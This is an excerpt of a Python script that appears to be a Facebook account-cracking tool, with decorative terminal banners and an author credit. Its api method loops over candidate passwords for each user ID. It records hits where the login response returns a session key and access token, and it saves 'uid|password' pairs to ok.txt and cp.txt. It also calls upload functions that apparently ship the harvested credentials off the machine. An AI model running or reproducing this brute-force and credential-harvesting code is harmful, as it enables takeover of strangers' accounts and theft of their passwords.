...
ha = current.day
today = date.today()
JISAN2 = "\033[1;33m■\033[1;32m■\x1b[0m"
...
[\033[1;92m✔\033[1;97m]FACEBOOK       \033[1;91m: \033[1;97mItz Jisan Xhowdhury 
...
\033[1;97m═══════════════════════════════════════════════"""
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [X1X4D-2-0] : %s/%s -> \033[0;92m [ X1X4D-2-0-OK:%s ]- \033[0;93m[X1X4D-2-0-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[X1X4D-2-0-OK😍] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [X1X4D-2-0-OK😍] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[X1X4D-2-0-CP😭] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [X1X4D-2-0-CP😭] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
